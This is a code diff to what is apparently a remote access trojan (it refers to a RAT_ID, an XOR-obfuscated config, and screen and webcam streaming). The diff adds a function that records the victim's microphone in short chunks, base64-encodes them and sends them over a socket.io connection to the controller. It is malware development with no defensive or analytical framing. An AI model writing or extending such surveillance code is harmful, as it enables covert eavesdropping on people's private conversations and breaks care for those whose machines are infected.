@@ -53,6 +53,12 @@ try:
 except:
     HAS_PYAUTOGUI = False
 
+try:
+    import sounddevice as sd
+    HAS_SOUNDDEVICE = True
+except:
+    HAS_SOUNDDEVICE = False
+
 # Config - XOR Obfuscated
 def xor_cipher(data, key="elite"):
     return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
@@ -1335,6 +1341,32 @@ def socketio_handler():
         finally:
             if 'cap' in locals():
                 cap.release()
+
+    def stream_audio_loop():
+        global audio_streaming
+        if not HAS_SOUNDDEVICE:
+            return
+        
+        try:
+            # 16kHz mono is good for voice and lightweight for streaming
+            fs = 16000
+            chunk_size = int(fs * 0.1) # 100ms chunks
+            
+            with sd.InputStream(samplerate=fs, channels=1, dtype='float32') as stream:
+                while audio_streaming:
+                    audio_chunk, overflowed = stream.read(chunk_size)
+                    if audio_chunk is not None:
+                        # Convert to base64 for transport
+                        chunk_b64 = base64.b64encode(audio_chunk.tobytes()).decode()
+                        sio_client.emit('audio_data', {
+                            'client_id': RAT_ID,
+                            'data': chunk_b64,
+                            'fs': fs
+                        })
+                    time.sleep(0.01)
+        except Exception as e:
+            print(f"Audio stream error: {e}")
+            audio_streaming = False
 
     def toggle_stream(data):
         global screen_streaming, webcam_streaming, audio_streaming, current_monitor
